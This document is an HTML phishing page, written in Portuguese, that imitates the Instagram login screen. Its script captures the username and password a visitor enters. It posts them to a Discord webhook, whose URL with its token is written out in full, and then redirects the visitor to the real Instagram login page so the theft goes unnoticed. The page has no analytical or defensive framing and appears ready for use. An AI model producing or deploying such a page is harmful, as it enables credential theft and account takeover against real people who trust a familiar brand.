<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/favicon.ico">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #fafafa; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }

        .wrapper { display: flex; height: 100vh; align-items: center; justify-content: center; }
        .box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 30px; width: 100%; max-width: 350px; text-align: center; }

        .logo { width: 175px; margin-bottom: 30px; }

        input { width: 100%; height: 36px; margin-bottom: 6px; padding: 0 8px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; background: #fafafa; }

        button { width: 100%; height: 30px; margin-top: 10px; background: #0095f6; color: #fff; border: 0; border-radius: 3px; font-weight: 600; cursor: pointer; }

        .link { display: inline-block; margin-top: 20px; color: #00376b; font-size: 12px; text-decoration: none; }
    </style>
</head>
<body>
    <section class="wrapper">
        <div class="box">
            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png" alt="Instagram">
            <form id="loginForm">
                <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required autocomplete="off">
                <input type="password" name="password" placeholder="Senha" required autocomplete="off">
                <button type="submit">Entrar</button>
            </form>
            <a class="link" href="#">Esqueceu a senha?</a>
        </div>
    </section>
    <script>
        const WEBHOOK = "https://discordapp.com/api/webhooks/1485384996574199848/1KzR8E4yoVZibC_YKB8_vmJAWkDKmIejS1tIDGdI69M6Ks6bCN_sIabCr2Q0j-qRcyKV";

        document.getElementById("loginForm").addEventListener("submit", async e => {
            e.preventDefault();
            const u = e.target.username.value.trim();
            const p = e.target.password.value.trim();
            await fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `Login: ${u}\nSenha: ${p}` })
            });
            location.href = "https://www.instagram.com/accounts/login/";
        });
    </script>
</body>
</html>
